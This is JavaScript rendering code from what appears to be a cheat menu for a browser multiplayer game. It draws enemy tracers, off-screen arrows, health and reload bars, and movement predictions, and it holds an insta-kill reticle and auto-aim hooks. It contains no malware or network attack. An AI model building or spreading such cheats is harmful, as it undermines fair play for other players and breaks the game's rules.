        mainContext.beginPath();
        mainContext.arc(0, 0, markSize, 0, Math.PI * 2);
        mainContext.fill();
      } else if (markType === "Outline") {
        mainContext.strokeStyle = fillColor;
        mainContext.lineWidth = 3;
        mainContext.beginPath();
        mainContext.arc(0, 0, markSize + 4, 0, Math.PI * 2);
        mainContext.stroke();
      } else if (markType === "Text") {
        const label = isPlayer ? "P" : isTeam ? "T" : "E";
        mainContext.font = `bold ${markSize * 2}px Arial`;
        mainContext.textAlign = "center";
        mainContext.textBaseline = "middle";
        mainContext.strokeStyle = outlineColor;
        mainContext.lineWidth = 3;
        mainContext.strokeText(label, 0, 0);
        mainContext.fillStyle = fillColor;
        mainContext.fillText(label, 0, 0);
      }

      mainContext.restore();
    });
  }

  if (!window.enemyArrowFades) window.enemyArrowFades = {};
  if (!window.enemyArrowPositions) window.enemyArrowPositions = {};
  const arrowFadeSpeed = 0.08;
  const activeEnemies = new Set();

  for (let i = 0; i < players.length; i++) {
    const enemy = players[i];
    if (!enemy || !enemy.visible || enemy === player || enemy.isTeam(player))
      continue;

    const myX = player.x - xOffset;
    const myY = player.y - yOffset;
    const enemyX = enemy.x - xOffset;
    const enemyY = enemy.y - yOffset;
    const dist = Math.sqrt((myX - enemyX) ** 2 + (myY - enemyY) ** 2);
    const shouldShow =
      dist >= 250 &&
      AB.Menu.showTracers &&
      AB.Menu.EnemyTracer &&
      AB.Menu.TracerType === "OffscreenArrow";

    activeEnemies.add(enemy.sid);
    if (window.enemyArrowFades[enemy.sid] === undefined) {
      window.enemyArrowFades[enemy.sid] = 0;
    }

    if (shouldShow) {
      window.enemyArrowFades[enemy.sid] = Math.min(
        1,
        window.enemyArrowFades[enemy.sid] + arrowFadeSpeed,
      );
    } else {
      window.enemyArrowFades[enemy.sid] = Math.max(
        0,
        window.enemyArrowFades[enemy.sid] - arrowFadeSpeed,
      );
    }

    const alpha = window.enemyArrowFades[enemy.sid];
    if (alpha <= 0) continue;

    const angle = Math.atan2(enemyY - myY, enemyX - myX);
    const arrowDist = AB.Menu.TracerArrowDistance || 150;
    const arrowX = myX + Math.cos(angle) * arrowDist;
    const arrowY = myY + Math.sin(angle) * arrowDist;
    const arrowSize = AB.Menu.TracerArrowSize || 12;
    const arrowAngle = Math.PI / 4;

    mainContext.save();
    mainContext.globalAlpha = alpha;
    mainContext.translate(arrowX, arrowY);
    mainContext.rotate(angle);
    mainContext.lineWidth = AB.Menu.EnemyTracerThickness || 3;
    mainContext.lineCap = "round";
    mainContext.lineJoin = "round";
    mainContext.strokeStyle = AB.Menu.EnemyTracerColor || "#ff0000";
    mainContext.beginPath();
    mainContext.moveTo(-arrowSize, -arrowSize * Math.tan(arrowAngle));
    mainContext.lineTo(0, 0);
    mainContext.lineTo(-arrowSize, arrowSize * Math.tan(arrowAngle));
    mainContext.stroke();
    mainContext.restore();

    window.enemyArrowPositions[enemy.sid] = { angle, myX, myY };
  }

  for (const sid in window.enemyArrowFades) {
    if (!activeEnemies.has(Number(sid))) {
      window.enemyArrowFades[sid] = Math.max(
        0,
        window.enemyArrowFades[sid] - arrowFadeSpeed,
      );

      const alpha = window.enemyArrowFades[sid];
      if (alpha > 0 && window.enemyArrowPositions[sid]) {
        const { angle, myX, myY } = window.enemyArrowPositions[sid];
        const arrowDist = AB.Menu.TracerArrowDistance || 150;
        const arrowX = myX + Math.cos(angle) * arrowDist;
        const arrowY = myY + Math.sin(angle) * arrowDist;
        const arrowSize = AB.Menu.TracerArrowSize || 12;
        const arrowAngle = Math.PI / 4;

        mainContext.save();
        mainContext.globalAlpha = alpha;
        mainContext.translate(arrowX, arrowY);
        mainContext.rotate(angle);
        mainContext.lineWidth = AB.Menu.EnemyTracerThickness || 3;
        mainContext.lineCap = "round";
        mainContext.lineJoin = "round";
        mainContext.strokeStyle = AB.Menu.EnemyTracerColor || "#ff0000";
        mainContext.beginPath();
        mainContext.moveTo(-arrowSize, -arrowSize * Math.tan(arrowAngle));
        mainContext.lineTo(0, 0);
        mainContext.lineTo(-arrowSize, arrowSize * Math.tan(arrowAngle));
        mainContext.stroke();
        mainContext.restore();
      }

      if (window.enemyArrowFades[sid] <= 0) {
        delete window.enemyArrowFades[sid];
        delete window.enemyArrowPositions[sid];
      }
    }
  }

  mainContext.globalAlpha = 1;

  mainContext.strokeStyle = darkOutlineColor;
  mainContext.globalAlpha = 1;

  mainContext.strokeStyle = AbyssColors.darkOutline;
  mainContext.globalAlpha = 1;
  for (let i = 0; i < players.length + ais.length; ++i) {
    tmpObj = players[i] || ais[i - players.length];
    if (tmpObj.visible) {
      mainContext.strokeStyle = AbyssColors.darkOutline;

      // Determine entity type for name toggle checks
      const isPlayerObj = tmpObj === player;
      const isTeamObj =
        !isPlayerObj &&
        tmpObj.isPlayer &&
        tmpObj.team &&
        tmpObj.team === player.team;
      const isEnemyObj = !isPlayerObj && tmpObj.isPlayer && !isTeamObj;
      const isAnimalObj = !tmpObj.isPlayer;

      const showName =
        AB.Menu.showNames &&
        ((isPlayerObj && AB.Menu.PlayerNameToggle) ||
          (isTeamObj && AB.Menu.TeamNameToggle) ||
          (isEnemyObj && AB.Menu.EnemyNameToggle) ||
          (isAnimalObj && AB.Menu.AnimalNameToggle));

      if (
        showName &&
        (tmpObj.skinIndex != 10 ||
          tmpObj === player ||
          (tmpObj.team && tmpObj.team == player.team))
      ) {
        let tmpText =
          (tmpObj.team ? "[" + tmpObj.team + "] " : "") +
          (tmpObj.name || "") +
          (tmpObj.isPlayer
            ? ` [${tmpObj.skinIndex === 45 && tmpObj.shameTimer > 0 ? tmpObj.shameTimer : tmpObj.shameCount}]`
            : "");
        if (!recording) {
          player.name = originalName;
        } else {
          player.name = "unknown";
        }
        if (tmpText != "") {
          const nameSize = AB.Menu.NameSize || 16;
          mainContext.font = tmpObj.isPlayer
            ? nameSize + "px Hammersmith One"
            : nameSize + 10 + "px Hammersmith One";
          // Use color based on entity type
          mainContext.fillStyle = isPlayerObj
            ? AB.Menu.PlayerNameColor || "#8ecc51"
            : isTeamObj
              ? AB.Menu.TeamNameColor || "#345eeb"
              : isEnemyObj
                ? AB.Menu.EnemyNameColor || "#cc5151"
                : AB.Menu.AnimalNameColor || "#ffca28";
          mainContext.textBaseline = "middle";
          mainContext.textAlign = "center";
          mainContext.lineWidth = tmpObj.nameScale ? 11 : 8;
          mainContext.lineJoin = "round";
          const namePosX = AB.Menu.NamePosX || 0;
          const namePosY = AB.Menu.NamePosY || -20;
          const nameX = tmpObj.x - xOffset + namePosX;
          const nameY = tmpObj.isPlayer
            ? tmpObj.y + 90 - yOffset - tmpObj.scale + namePosY
            : tmpObj.y - yOffset - tmpObj.scale - config.nameY + namePosY;
          mainContext.strokeText(tmpText, nameX, nameY);
          mainContext.fillText(tmpText, nameX, nameY);
          if (
            tmpObj.isLeader &&
            iconSprites.crown.isLoaded &&
            AB.Menu.showLeaderName !== false
          ) {
            let tmpS = tmpObj.isPlayer ? 28 : 38;
            let nameY = tmpObj.isPlayer
              ? tmpObj.y + 90 - yOffset - tmpObj.scale
              : tmpObj.y - yOffset - tmpObj.scale - config.nameY;
            let tmpX =
              tmpObj.x -
              xOffset -
              tmpS -
              mainContext.measureText(tmpText).width / 2 -
              4;
            mainContext.drawImage(
              iconSprites.crown,
              tmpX,
              nameY - tmpS / 2 - 1,
              tmpS,
              tmpS,
            );
          }
          if (
            tmpObj.iconIndex == 1 &&
            iconSprites.skull.isLoaded &&
            AB.Menu.showSkullName !== false
          ) {
            let tmpS = tmpObj.isPlayer ? 28 : 38;
            let nameY = tmpObj.isPlayer
              ? tmpObj.y + 90 - yOffset - tmpObj.scale
              : tmpObj.y - yOffset - tmpObj.scale - config.nameY;
            let tmpX =
              tmpObj.x -
              xOffset +
              mainContext.measureText(tmpText).width / 2 +
              4;
            mainContext.drawImage(
              iconSprites.skull,
              tmpX,
              nameY - tmpS / 2 - 1,
              tmpS,
              tmpS,
            );
          }
          if (
            tmpObj.isPlayer &&
            instaC.wait &&
            near == tmpObj &&
            enemy.length
          ) {
            const size = tmpObj.scale * 2.2;
            mainContext.drawImage(
              instaReticle,
              tmpObj.x - xOffset - size / 2,
              tmpObj.y - yOffset - size / 2,
              size,
              size,
            );
          }
        }
        function Line(context, type, type2, width, color) {
          context.save();
          context.lineCap = "round";
          context.strokeStyle = color;
          context.lineWidth = width;
          context.beginPath();
          context.moveTo(type.x - xOffset, type.y - yOffset);
          context.lineTo(type2.x - xOffset, type2.y - yOffset);
          context.stroke();
          context.closePath();
          context.restore();
        }
        const r = items.weapons[tmpObj.weaponIndex]?.range,
          ex = tmpObj.x + Math.cos(tmpObj.dir) * r,
          ey = tmpObj.y + Math.sin(tmpObj.dir) * r;

        if (tmpObj === player) {
          Line(
            mainContext,
            { x: tmpObj.x, y: tmpObj.y },
            { x: ex, y: ey },
            3,
            "Green",
          );
        }

        // Check health bar toggle settings
        const isPlayer = tmpObj === player;
        const isTeam = !isPlayer && tmpObj.team && tmpObj.team === player.team;
        const isEnemy = !isPlayer && !isTeam;
        const showHealthBar =
          AB.Menu.HealthBar &&
          ((isPlayer && AB.Menu.PlayerHealthBar) ||
            (isTeam && AB.Menu.TeamHealthBar) ||
            (isEnemy && AB.Menu.EnemyHealthBar));

        if (tmpObj.health > 0 && showHealthBar) {
          if (tmpObj.displayHealth === undefined) {
            tmpObj.displayHealth = tmpObj.health;
          }

          tmpObj.displayHealth += (tmpObj.health - tmpObj.displayHealth) * 0.15;

          const baseX = tmpObj.x - xOffset;
          const baseY = tmpObj.y - yOffset + tmpObj.scale + config.nameY;

          const outlineX =
            baseX - (config.healthBarWidth + config.healthBarPad);
          const outlineW = config.healthBarWidth * 2 + config.healthBarPad * 2;

          const t = performance.now() * 0.001;
          const baseShift = 50;
          const waveAmplitude = 25;
          const waveSpeed = 0.2;

          const animatedShift =
            baseShift + Math.sin(t * waveSpeed) * waveAmplitude;

          const outlineGrad = mainContext.createLinearGradient(
            outlineX + animatedShift,
            0,
            outlineX + outlineW + animatedShift,
            0,
          );

          outlineGrad.addColorStop(0, "#000000");
          outlineGrad.addColorStop(0.5, "#120018");
          outlineGrad.addColorStop(1, "#1e002f");

          mainContext.fillStyle = outlineGrad;

          mainContext.roundRect(
            baseX - (config.healthBarWidth + config.healthBarPad),
            baseY,
            config.healthBarWidth * 2 + config.healthBarPad * 2,
            17,
            8,
          );
          mainContext.fill();

          mainContext.fillStyle = isPlayer
            ? AB.Menu.PlayerHealthBarColor
            : isTeam
              ? AB.Menu.TeamHealthBarColor
              : AB.Menu.EnemyHealthBarColor;

          const healthFillWidth =
            config.healthBarWidth *
            2 *
            (tmpObj.displayHealth / tmpObj.maxHealth);
          mainContext.roundRect(
            baseX - config.healthBarWidth,
            baseY + config.healthBarPad,
            healthFillWidth,
            17 - config.healthBarPad * 2,
            7,
          );
          mainContext.fill();
          if (tmpObj.isPlayer) {
            const reloadY =
              tmpObj.y - yOffset + tmpObj.scale + config.nameY + 17 + 1;
            const halfW = config.healthBarWidth;
            const barHeight = 17 - config.healthBarPad * 2;

            const barOuterH = 17;
            const barInnerH = barOuterH - config.healthBarPad * 2;

            const gap = 6;
            const totalInnerW = config.healthBarWidth * 2 - gap;
            const barInnerW = totalInnerW / 2;
            const barOuterW = barInnerW + config.healthBarPad * 2;

            const reload0 = tmpObj.reloads?.[tmpObj.primaryIndex] ?? 0;
            const reload1 = tmpObj.reloads?.[tmpObj.secondaryIndex] ?? 0;

            const reloadTime0 =
              tmpObj.primaryIndex !== undefined
                ? items.weapons[tmpObj.primaryIndex]?.speed || 300
                : 300;
            const reloadTime1 =
              tmpObj.secondaryIndex !== undefined
                ? items.weapons[tmpObj.secondaryIndex]?.speed || 300
                : 300;

            if (tmpObj.displayReload0 === undefined)
              tmpObj.displayReload0 = reload0;
            if (tmpObj.displayReload1 === undefined)
              tmpObj.displayReload1 = reload1;

            tmpObj.displayReload0 += (reload0 - tmpObj.displayReload0) * 0.15;
            tmpObj.displayReload1 += (reload1 - tmpObj.displayReload1) * 0.15;

            const ratio0 = Math.max(
              0,
              Math.min(1, 1 - tmpObj.displayReload0 / reloadTime0),
            );
            const ratio1 = Math.max(
              0,
              Math.min(1, 1 - tmpObj.displayReload1 / reloadTime1),
            );

            const leftOuterX =
              baseX - config.healthBarWidth - config.healthBarPad;
            const rightOuterX = leftOuterX + barOuterW - 2;

            const leftInnerX = leftOuterX + config.healthBarPad;
            const rightInnerX = rightOuterX + config.healthBarPad;

            mainContext.fillStyle = outlineGrad;
            mainContext.roundRect(leftOuterX, reloadY, barOuterW, barOuterH, 8);
            mainContext.fill();

            mainContext.fillStyle = "#4da6ff";
            mainContext.roundRect(
              leftInnerX,
              reloadY + config.healthBarPad,
              barInnerW * ratio0,
              barInnerH,
              7,
            );
            mainContext.fill();
            mainContext.fillStyle = outlineGrad;
            mainContext.roundRect(
              rightOuterX,
              reloadY,
              barOuterW,
              barOuterH,
              8,
            );
            mainContext.fill();

            mainContext.fillStyle = "#4da6ff";
            mainContext.roundRect(
              rightInnerX,
              reloadY + config.healthBarPad,
              barInnerW * ratio1,
              barInnerH,
              7,
            );
            mainContext.fill();
          }
        }
      }
    }
  }

  textManager.update(delta, mainContext, xOffset, yOffset);

  players.forEach((tmp) => {
    tmpObj = tmp;
    if (tmpObj.visible && tmpObj.chatCountdown > 0) {
      tmpObj.chatCountdown = Math.max(0, (tmpObj.chatCountdown -= delta));
      mainContext.font = "32px 'Comic Sans MS', cursive";
      var tmpSize = mainContext.measureText(tmpObj.chatMessage);
      mainContext.textBaseline = "middle";
      mainContext.textAlign = "center";
      var tmpX = tmpObj.x - xOffset;
      var tmpY = tmpObj.y - tmpObj.scale - yOffset - 90;
      var tmpH = 47;
      var tmpW = tmpSize.width + 30;
      var padding = 10;
      var tailSize = 12;
      var earSize = 30;
      var bubbleColor = "rgba(0, 0, 0, 0.25)";
      var textColor = "#fff";

      mainContext.roundRect(
        tmpX - tmpW / 2,
        tmpY - tmpH / 2,
        tmpW,
        tmpH,
        15,
        tailSize,
        earSize,
      );
      mainContext.fillStyle = bubbleColor;
      mainContext.fill();

      mainContext.fillStyle = textColor;
      mainContext.fillText(tmpObj.chatMessage, tmpX, tmpY);
    }
  });

  mainContext.globalAlpha = 1;
  renderMinimap(delta);

  if (!window.tracerFades) window.tracerFades = {};
  const lineFadeSpeed = 0.08;

  const drawTracer = (target, thickness, color, tracerType) => {
    if (!target || !player || !mainContext) return;
    const px = player.x - xOffset;
    const py = player.y - yOffset;
    const tx = target.x - xOffset;
    const ty = target.y - yOffset;
    const dist = Math.hypot(tx - px, ty - py);
    const angle = Math.atan2(ty - py, tx - px);

    mainContext.save();

    switch (tracerType) {
      case "Arrow": {
        const arrowLen = 15;
        const arrowAngle = Math.PI / 6;
        mainContext.strokeStyle = color;
        mainContext.lineWidth = thickness;
        mainContext.lineCap = "round";
        mainContext.beginPath();
        mainContext.moveTo(px, py);
        mainContext.lineTo(tx, ty);
        mainContext.stroke();
        mainContext.beginPath();
        mainContext.moveTo(
          tx - arrowLen * Math.cos(angle - arrowAngle),
          ty - arrowLen * Math.sin(angle - arrowAngle),
        );
        mainContext.lineTo(tx, ty);
        mainContext.lineTo(
          tx - arrowLen * Math.cos(angle + arrowAngle),
          ty - arrowLen * Math.sin(angle + arrowAngle),
        );
        mainContext.stroke();
        break;
      }
      case "Dashed": {
        const dashLen = AB.Menu.TracerDashLength || 10;
        const dashGap = AB.Menu.TracerDashGap || 5;
        mainContext.strokeStyle = color;
        mainContext.lineWidth = thickness;
        mainContext.setLineDash([dashLen, dashGap]);
        mainContext.beginPath();
        mainContext.moveTo(px, py);
        mainContext.lineTo(tx, ty);
        mainContext.stroke();
        mainContext.setLineDash([]);
        break;
      }
      case "Glow": {
        const blur = AB.Menu.TracerGlowBlur || 15;
        mainContext.shadowColor = color;
        mainContext.shadowBlur = blur;
        mainContext.strokeStyle = color;
        mainContext.lineWidth = thickness;
        mainContext.beginPath();
        mainContext.moveTo(px, py);
        mainContext.lineTo(tx, ty);
        mainContext.stroke();
        mainContext.shadowBlur = 0;
        break;
      }
      case "Pulse": {
        const speed = AB.Menu.TracerPulseSpeed || 200;
        const pulse = 0.5 + 0.5 * Math.sin(Date.now() / speed);
        mainContext.globalAlpha *= 0.3 + pulse * 0.7;
        mainContext.strokeStyle = color;
        mainContext.lineWidth = thickness + pulse * 3;
        mainContext.lineCap = "round";
        mainContext.beginPath();
        mainContext.moveTo(px, py);
        mainContext.lineTo(tx, ty);
        mainContext.stroke();
        break;
      }
      case "Phantom": {
        const minShowDist = 600;
        const fadeStartDist = 500;
        const fadeEndDist = 700;

        if (dist < fadeStartDist) break;

        let phantomAlpha = 1;
        if (dist < fadeEndDist) {
          phantomAlpha = (dist - fadeStartDist) / (fadeEndDist - fadeStartDist);
        }

        const baseDist = AB.Menu.TracerPhantomDistance || 150;
        const dynamicDist = Math.min(
          baseDist + (dist - minShowDist) * 0.1,
          300,
        );
        const phantomOpacity =
          ((AB.Menu.TracerPhantomOpacity || 50) / 100) * phantomAlpha;
        const phantomX = px + Math.cos(angle) * dynamicDist;
        const phantomY = py + Math.sin(angle) * dynamicDist;
        const facingAngle = angle + Math.PI;

        if (
          target &&
          typeof renderPlayer === "function" &&
          phantomOpacity > 0.01
        ) {
          const phantomObj = {
            x: phantomX + xOffset,
            y: phantomY + yOffset,
            dir: facingAngle,
            scale: target.scale || 35,
            skinColor: target.skinColor || 0,
            tailIndex: 0,
            skinIndex: 0,
            buildIndex: -1,
            weaponIndex: target.weaponIndex || 0,
            weaponVariant: target.weaponVariant || 0,
            skinRot: 0,
            zIndex: 0,
            visible: true,
          };

          mainContext.save();
          mainContext.globalAlpha *= phantomOpacity;
          mainContext.translate(phantomX, phantomY);
          mainContext.rotate(facingAngle);
          renderPlayer(phantomObj, mainContext);
          mainContext.restore();
        }
        break;
      }
      case "Curved": {
        const curveAmt = (AB.Menu.TracerCurveAmount || 20) / 100;
        const midX = (px + tx) / 2;
        const midY = (py + ty) / 2 - dist * curveAmt;
        mainContext.strokeStyle = color;
        mainContext.lineWidth = thickness;
        mainContext.beginPath();
        mainContext.moveTo(px, py);
        mainContext.quadraticCurveTo(midX, midY, tx, ty);
        mainContext.stroke();
        break;
      }
      case "Segmented": {
        const segments = AB.Menu.TracerSegmentCount || 5;
        mainContext.strokeStyle = color;
        mainContext.lineWidth = thickness;
        mainContext.lineCap = "round";
        for (let i = 0; i < segments; i += 2) {
          const startRatio = i / segments;
          const endRatio = (i + 1) / segments;
          mainContext.beginPath();
          mainContext.moveTo(
            px + (tx - px) * startRatio,
            py + (ty - py) * startRatio,
          );
          mainContext.lineTo(
            px + (tx - px) * endRatio,
            py + (ty - py) * endRatio,
          );
          mainContext.stroke();
        }
        break;
      }
      case "Gradient": {
        const gradient = mainContext.createLinearGradient(px, py, tx, ty);
        gradient.addColorStop(0, color);
        gradient.addColorStop(1, "rgba(255,255,255,0.3)");
        mainContext.strokeStyle = gradient;
        mainContext.lineWidth = thickness;
        mainContext.lineCap = "round";
        mainContext.beginPath();
        mainContext.moveTo(px, py);
        mainContext.lineTo(tx, ty);
        mainContext.stroke();
        break;
      }
      case "Line":
      default: {
        mainContext.strokeStyle = color;
        mainContext.lineWidth = thickness;
        mainContext.lineCap = "round";
        mainContext.beginPath();
        mainContext.moveTo(px, py);
        mainContext.lineTo(tx, ty);
        mainContext.stroke();
        break;
      }
    }

    mainContext.restore();
  };

  if (!window.tracerTargets) window.tracerTargets = {};
  const activeTracerKeys = new Set();

  if (
    inGame &&
    player &&
    mainContext &&
    AB.Menu.showTracers &&
    AB.Menu.TracerType !== "OffscreenArrow"
  ) {
    const tracerType = AB.Menu.TracerType || "Line";

    if (AB.Menu.EnemyTracer && enemy.length) {
      enemy.forEach((e) => {
        if (e && e.visible !== false) {
          const key = "enemy_" + e.sid;
          activeTracerKeys.add(key);
          if (window.tracerFades[key] === undefined)
            window.tracerFades[key] = 0;
          window.tracerFades[key] = Math.min(
            1,
            window.tracerFades[key] + lineFadeSpeed,
          );
          window.tracerTargets[key] = {
            target: e,
            thickness: AB.Menu.EnemyTracerThickness || 3,
            color: AB.Menu.EnemyTracerColor || "#ff0000",
            type: tracerType,
          };
        }
      });
    }

    if (AB.Menu.TeamTracer && players.length) {
      players.forEach((p) => {
        if (p && p !== player && p.visible && p.isTeam && p.isTeam(player)) {
          const key = "team_" + p.sid;
          activeTracerKeys.add(key);
          if (window.tracerFades[key] === undefined)
            window.tracerFades[key] = 0;
          window.tracerFades[key] = Math.min(
            1,
            window.tracerFades[key] + lineFadeSpeed,
          );
          window.tracerTargets[key] = {
            target: p,
            thickness: AB.Menu.TeamTracerThickness || 3,
            color: AB.Menu.TeamTracerColor || "#4fc3f7",
            type: tracerType,
          };
        }
      });
    }

    if (AB.Menu.AnimalTracer && ais && ais.length) {
      ais.forEach((a) => {
        if (a && a.visible && a.active) {
          const key = "animal_" + a.index;
          activeTracerKeys.add(key);
          if (window.tracerFades[key] === undefined)
            window.tracerFades[key] = 0;
          window.tracerFades[key] = Math.min(
            1,
            window.tracerFades[key] + lineFadeSpeed,
          );
          window.tracerTargets[key] = {
            target: a,
            thickness: AB.Menu.AnimalTracerThickness || 3,
            color: AB.Menu.AnimalTracerColor || "#ffca28",
            type: tracerType,
          };
        }
      });
    }
  }

  for (const key in window.tracerFades) {
    if (!activeTracerKeys.has(key)) {
      window.tracerFades[key] = Math.max(
        0,
        window.tracerFades[key] - lineFadeSpeed,
      );
    }

    const alpha = window.tracerFades[key];
    if (alpha > 0 && window.tracerTargets[key]) {
      const { target, thickness, color, type } = window.tracerTargets[key];
      if (target) {
        mainContext.save();
        mainContext.globalAlpha = alpha;
        drawTracer(target, thickness, color, type);
        mainContext.restore();
      }
    }

    if (alpha <= 0) {
      delete window.tracerFades[key];
      delete window.tracerTargets[key];
    }
  }

  if (inGame && player && mainContext) {
    if (AB.Menu.showTrapWarnings) {
      gameObjects.forEach((obj) => {
        if (
          obj &&
          obj.trap &&
          obj.active &&
          obj.isTeamObject &&
          !obj.isTeamObject(player)
        ) {
          Mod.Visuals.trapWarning(obj, AB.Menu.TrapWarningColor);
        }
      });
    }

    if (AB.Menu.showSpikeTickIndicators) {
      gameObjects.forEach((obj) => {
        if (
          obj &&
          obj.dmg &&
          obj.active &&
          obj.isTeamObject &&
          !obj.isTeamObject(player)
        ) {
          const dist = UTILS.getDistance(obj.x, obj.y, player.x, player.y);
          if (dist < 200) {
            Mod.Visuals.spikeTick(obj, AB.Menu.SpikeTickColor);
          }
        }
      });
    }

    const predictType = AB.Menu.predictType;
    if (predictType && predictType !== "disableRender" && Mod.enemy) {
      Mod.enemy.forEach((enemy) => {
        if (enemy && enemy.visible !== false) {
          const ex = enemy.x;
          const ey = enemy.y;

          const velX =
            enemy.oldPos && enemy.oldPos.x2 !== undefined
              ? enemy.x2 - enemy.oldPos.x2
              : 0;
          const velY =
            enemy.oldPos && enemy.oldPos.y2 !== undefined
              ? enemy.y2 - enemy.oldPos.y2
              : 0;
          const rawSpeed = Math.sqrt(velX * velX + velY * velY);

          if (rawSpeed >= 0.5) {
            const moveDir = Math.atan2(velY, velX);
            const stepDist = Math.min(rawSpeed, 40);

            mainContext.save();
            mainContext.strokeStyle = "#00ffff";
            mainContext.lineWidth = 2;
            mainContext.globalAlpha = 0.6;

            const steps = predictType === "pre3" ? 3 : 2;
            for (let i = 1; i <= steps; i++) {
              const predX = ex + Math.cos(moveDir) * stepDist * i;
              const predY = ey + Math.sin(moveDir) * stepDist * i;
              mainContext.beginPath();
              mainContext.arc(
                predX - xOffset,
                predY - yOffset,
                5,
                0,
                Math.PI * 2,
              );
              mainContext.stroke();
            }
            mainContext.beginPath();
            mainContext.moveTo(ex - xOffset, ey - yOffset);
            mainContext.lineTo(
              ex + Math.cos(moveDir) * stepDist * steps - xOffset,
              ey + Math.sin(moveDir) * stepDist * steps - yOffset,
            );
            mainContext.stroke();

            mainContext.restore();
          }
        }
      });
    }
  }
}

window.requestAnimFrame = function () {
  return null;
};
window.rAF = (function () {
  return (
    window.requestAnimationFrame ||
    window.webkitRequestAnimationFrame ||
    window.mozRequestAnimationFrame ||
    function (callback) {
      window.setTimeout(callback, 1000 / 9);
    }
  );
})();

function doUpdate() {
  now = performance.now();
  delta = now - lastUpdate;
  lastUpdate = now;
  let timer = performance.now();
  let diff = timer - fpsTimer.last;
  if (diff >= 1000) {
    fpsTimer.ltime = fpsTimer.time * (1000 / diff);

    fpsTimer.last = timer;
    fpsTimer.time = 0;
  }
  fpsTimer.time++;

  getEl("pingFps").textContent = `${window.pingTime}ms`;
  getEl("fpsCounter").textContent = Math.round(fpsTimer.ltime);
  getEl("packetStatus").innerHTML = secPacket;
  updateGame();
  rAF(doUpdate);
  ms.avg = Math.round((ms.min + ms.max) / 2);
}

prepareMenuBackground();
doUpdate();

function toggleUseless(boolean) { }
toggleUseless(useWasd);

window.debug = function () {
  my.waitHit = 0;
  my.autoAim = false;
  instaC.isTrue = false;
  traps.inTrap = false;
  itemSprites = [];
  objSprites = [];
  gameObjectSprites = [];
  skinSprites = [];
  skinPointers = [];
  skinSprites2 = [];
  skinPointers2 = [];
  accessSprites = [];
  toolSprites = [];
  projectileSprites = [];
  aiSprites = [];
  console.clear();
};

window.wasdMode = function () {
  useWasd = !useWasd;
  toggleUseless(useWasd);
};

window.startGrind = function () {
  if (AB.Menu.weaponGrind) {
    for (let i = 0; i < Math.PI * 2; i += Math.PI / 2) {
      checkPlace(player.getItemType(22), i);
    }
  }
};

window.resBuild = function () {
  if (gameObjects.length) {
    gameObjects.forEach((tmp) => {
      tmp.breakObj = false;
    });
    breakObjects = [];
  }
};

window.toggleVisual = function () {
  config.anotherVisual = !config.anotherVisual;
  gameObjects.forEach((tmp) => {
    if (tmp.active) {
      tmp.dir = tmp.lastDir;
    }
  });
};

window.prepareUI = function (tmpObj) {
  resize();
  for (let i = 0; i < items.list.length + items.weapons.length; ++i) {
    (function (i) {
      let tmpCanvas = document.createElement("canvas");
      tmpCanvas.width = tmpCanvas.height = 66;
      let tmpContext = tmpCanvas.getContext("2d");
      tmpContext.translate(tmpCanvas.width / 2, tmpCanvas.height / 2);
      tmpContext.imageSmoothingEnabled = false;
      tmpContext.webkitImageSmoothingEnabled = false;
      tmpContext.mozImageSmoothingEnabled = false;

      if (items.weapons[i]) {
        tmpContext.rotate(Math.PI / 4 + Math.PI);
        let tmpSprite = new Image();
        toolSprites[items.weapons[i].src] = tmpSprite;
        tmpSprite.onload = function () {
          this.isLoaded = true;
          let tmpPad = 1 / (this.height / this.width);
          let tmpMlt = items.weapons[i].iPad || 1;
          tmpContext.drawImage(
            this,
            -(tmpCanvas.width * tmpMlt * config.iconPad * tmpPad) / 2,
            -(tmpCanvas.height * tmpMlt * config.iconPad) / 2,
            tmpCanvas.width * tmpMlt * tmpPad * config.iconPad,
            tmpCanvas.height * tmpMlt * config.iconPad,
          );
          tmpContext.fillStyle = "rgba(0, 0, 70, 0.1)";
          tmpContext.globalCompositeOperation = "source-atop";
          tmpContext.fillRect(
            -tmpCanvas.width / 2,
            -tmpCanvas.height / 2,
            tmpCanvas.width,
            tmpCanvas.height,
          );
          getEl("actionBarItem" + i).style.backgroundImage =
            "url(" + tmpCanvas.toDataURL() + ")";
        };
        tmpSprite.src = "./../img/weapons/" + items.weapons[i].src + ".png";
        let tmpUnit = getEl("actionBarItem" + i);
        tmpUnit.onmouseover = UTILS.checkTrusted(function () {
          showItemInfo(items.weapons[i], true);
        });
        tmpUnit.onclick = UTILS.checkTrusted(function () {
          selectWeapon(tmpObj.weapons[items.weapons[i].type]);
        });
        UTILS.hookTouchEvents(tmpUnit);
      } else {
        let tmpSprite = getItemSprite(
          items.list[i - items.weapons.length],
          true,
        );
        let tmpScale = Math.min(
          tmpCanvas.width - config.iconPadding,
          tmpSprite.width,
        );
        tmpContext.globalAlpha = 1;
        tmpContext.drawImage(
          tmpSprite,
          -tmpScale / 2,
          -tmpScale / 2,
          tmpScale,
          tmpScale,
        );
        tmpContext.fillStyle = "rgba(0, 0, 70, 0.1)";
        tmpContext.globalCompositeOperation = "source-atop";
        tmpContext.fillRect(-tmpScale / 2, -tmpScale / 2, tmpScale, tmpScale);
        getEl("actionBarItem" + i).style.backgroundImage =
          "url(" + tmpCanvas.toDataURL() + ")";
        let tmpUnit = getEl("actionBarItem" + i);
        tmpUnit.onmouseover = UTILS.checkTrusted(function () {
          showItemInfo(items.list[i - items.weapons.length]);
        });
        tmpUnit.onclick = UTILS.checkTrusted(function () {
          selectToBuild(
            tmpObj.items[tmpObj.getItemType(i - items.weapons.length)],
          );
        });
        UTILS.hookTouchEvents(tmpUnit);
      }
    })(i);
  }
};